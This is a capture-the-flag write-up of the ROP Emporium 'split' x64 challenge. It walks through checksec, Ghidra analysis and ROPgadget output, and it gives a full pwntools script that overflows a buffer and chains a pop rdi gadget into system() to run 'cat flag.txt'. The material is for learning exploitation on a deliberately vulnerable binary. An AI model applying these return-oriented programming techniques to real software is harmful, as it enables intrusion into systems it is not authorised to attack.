---
title: ROP Emporium - split (x64) - writeup
date: 2023-03-13 22:07:31 +0100
author: farrimwildaxe
categories: [Writeup,ROP Emporium]
tags: [rop,emporium,x64,split,writeup,pwntools]
img_path: /assets/img/ropemporium/split
published: true
---


Split is a second challenge from [ROP Emporium](https://ropemporium.com/challenge/split.html) where your goal is to find elements scattered all over the binary and use them to get the flag. So, let’s start our hunting!

First of all, checksec:

```python
┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/split]
└─$ [2023-03-14 22:48:20] checksec ./split                                                                                                                                                                                                 
[*] '/home/kali/ropemporium/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So, as in previous binary also here NX bit is set.

Let’s check in Ghidra what’s inside this binary:

![split - using Ghidra to check what's insde the binary](split-main.png)

OK, there’s `pwnme()` function and it looks like a target (same as in first challenge):

![split - using Ghidra to check what's insde the pwnme function](split-pwnme.png)

There’s also `usefulFunction()` hidden, which is using `system()` call:

![split - using Ghidra to check what's insde the usefulFunction function](split-useful.png)

Unfortunately for us, its parameter is `/bin/ls` so we need to find a way to provide proper parameter. After fiddling around we found something in `Labels` - there’s `/bin/cat flag.txt` string hidden, at address `0x00601060`, we can use it in `system()` call. All we need is to chain all that findings.

![split - /bin/cat hidden in labels](split-cat.png)

So, to make this working we need to swap `/bin/ls` into `/bin/cat flag.txt`. Linux (and other Unix and Unix-like operating systems) follows **System V AMD64 ABI** where function arguments (first six) are stored in the following registers: **RDI, RSI, RDX, RCX, R8, R9**. To switch first argument we need to find pop/ret ROP gadget operating on **RDI** register:

```bash
┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/split]
└─$ [2023-03-14 22:33:58] ROPgadget --binary ./split --only "pop|ret"                                                                                                                                                                      
Gadgets information
============================================================
0x00000000004007bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007c0 : pop r14 ; pop r15 ; ret
0x00000000004007c2 : pop r15 ; ret
0x00000000004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007bf : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400618 : pop rbp ; ret
0x00000000004007c3 : pop rdi ; ret
0x00000000004007c1 : pop rsi ; pop r15 ; ret
0x00000000004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040053e : ret
0x0000000000400542 : ret 0x200a

Unique gadgets found: 12
```

And here it is: `0x00000000004007c3 : pop rdi ; ret` so this is our first element in chain, next is the address of `/bin/cat` string found earlier, and last one would be an address to `system()` call. Putting it all together in pwntools script:

```python
from pwn import *

context.log_level="debug"

elf = context.binary = ELF("split")

gs = '''
break main
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()
io.recvuntil(b"> ")

payload  = b"A" * 40 
payload += p64(0x004007c3) # pop rdi; ret
payload += p64(0x00601060) # /bin/cat flag.txt
payload += p64(0x0040074b) # system()

io.sendline(payload)

io.interactive()
```

Let’s check how it’s working:

![split - exploit output](split-output.png)

And voila, flag is ours! 🙂



